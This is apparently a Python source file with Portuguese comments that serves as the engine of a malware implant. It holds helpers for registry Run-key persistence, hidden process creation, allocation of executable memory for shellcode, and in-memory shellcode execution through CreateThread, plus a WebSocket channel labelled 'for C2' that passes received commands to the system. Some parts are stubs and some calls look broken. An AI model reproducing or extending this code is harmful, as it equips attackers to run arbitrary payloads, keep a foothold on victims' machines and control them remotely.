# cookiescript/engine.py
import ctypes
import ctypes.wintypes
from ctypes import wintypes
import asyncio
import inspect
import sys

class SystemAccess:
    """Acesso direto ao sistema Windows/Linux"""
    
    def __init__(self):
        if sys.platform == 'win32':
            self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            self.advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
            self.user32 = ctypes.WinDLL('user32', use_last_error=True)
    
    def escrever_registro(self, chave, valor):
        """Escreve no registro do Windows"""
        if sys.platform == 'win32':
            # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
            advapi32 = self.advapi32
            RegCreateKeyExW = advapi32.RegCreateKeyExW
            RegSetValueExW = advapi32.RegSetValueExW
            
            hkey = wintypes.HKEY()
            # Código para abrir chave e escrever valor
    
    def criar_processo_oculto(self, comando):
        """Cria processo sem janela"""
        STARTF_USESHOWWINDOW = 0x00000001
        SW_HIDE = 0
        CREATE_NO_WINDOW = 0x08000000
        
        startupinfo = wintypes.STARTUPINFOW()
        startupinfo.cb = ctypes.sizeof(wintypes.STARTUPINFOW)
        startupinfo.dwFlags = STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = SW_HIDE
        
        processinfo = wintypes.PROCESS_INFORMATION()
        
        self.kernel32.CreateProcessW(
            None, comando, None, None, False, 
            CREATE_NO_WINDOW, None, None, 
            ctypes.byref(startupinfo), 
            ctypes.byref(processinfo)
        )
    
    def alocar_memoria(self, tamanho):
        """Aloca memória executável (para shellcode)"""
        MEM_COMMIT = 0x00001000
        MEM_RESERVE = 0x00002000
        PAGE_EXECUTE_READWRITE = 0x40
        
        return self.kernel32.VirtualAlloc(
            None, tamanho, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
    
    def injetar_shellcode(self, shellcode):
        """Executa shellcode diretamente na memória"""
        ptr = self.alocar_memoria(len(shellcode))
        ctypes.memmove(ptr, shellcode, len(shellcode))
        
        # Cria thread para executar
        thread_id = wintypes.DWORD()
        self.kernel32.CreateThread(None, 0, ptr, None, 0, ctypes.byref(thread_id))

class WebAccess:
    """Acesso a web services via JavaScript bridge"""
    
    def __init__(self):
        self.js_runtime = self._iniciar_v8()
    
    def _iniciar_v8(self):
        """Usa V8 engine diretamente (sem Node)"""
        # Usar libv8 ou dukpy para embed JS
        import dukpy
        return dukpy.JSInterpreter()
    
    async def fazer_request(self, url, metodo='GET', dados=None):
        """Faz requisição HTTP via JS"""
        codigo_js = f"""
        const response = await fetch('{url}', {{
            method: '{metodo}',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({dados})
        }});
        return await response.json();
        """
        return await self.js_runtime.eval(codigo_js)
    
    def criar_websocket(self, url):
        """Cria conexão WebSocket para C2"""
        codigo_js = f"""
        const ws = new WebSocket('{url}');
        ws.onmessage = (event) => {{
            // Envia para o sistema
            python.send_to_system(event.data);
        }};
        """
        self.js_runtime.eval(codigo_js)